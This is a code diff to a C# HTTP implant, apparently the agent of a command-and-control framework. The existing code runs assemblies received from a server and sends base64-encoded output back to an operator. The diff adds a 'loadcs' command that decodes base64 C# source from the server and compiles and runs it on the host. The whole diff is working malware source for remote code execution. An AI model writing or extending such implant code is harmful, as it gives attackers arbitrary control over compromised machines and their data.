@@ -7,6 +7,7 @@ using System.Timers;
 using HTTPImplant.Modules;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
+using NewImplant.Modules;
 
 namespace HTTPImplant
 {
@@ -43,7 +44,7 @@ namespace HTTPImplant
                         command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"File" }, StringSplitOptions.None)[1];
                         command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
                         command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\"}" }, StringSplitOptions.None)[1];
-                        Console.WriteLine(command.File);
+
                         await Task.Delay(5000);
 
                         if (command.command == lastCommandExecuted)
@@ -81,6 +82,30 @@ namespace HTTPImplant
                             string output = ExecuteAssembly.Execute(bytes);
                             string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                             await SendResult(webClient, implantId, command.Operator, outputBase64);
+                        }
+                        else if (command.Input.Trim().ToLower().Equals("loadcs"))
+                        {
+                            try
+                            {
+                                // Split the information in command.File
+                                string[] parts = command.File.Split(new[] { " # " }, StringSplitOptions.None);
+                                string encodedSourceCode = parts[0];
+                                string className = parts[1];
+                                string methodName = parts[2];
+
+                                // Decode the source code
+                                byte[] data = Convert.FromBase64String(encodedSourceCode);
+                                string decodedSourceCode = Encoding.UTF8.GetString(data);
+
+                                Console.WriteLine("\r\n\r\nExecuting: " + className + "." + methodName + " For:");
+                                Console.WriteLine("\r\n\r\n" + decodedSourceCode + "\r\n\r\n");
+
+                                CompileAndRunNET.ExecuteCS(decodedSourceCode, className, methodName);
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine("Exception caught: " + ex.ToString());
+                            }
                         }
                     }
                     catch (Exception e)
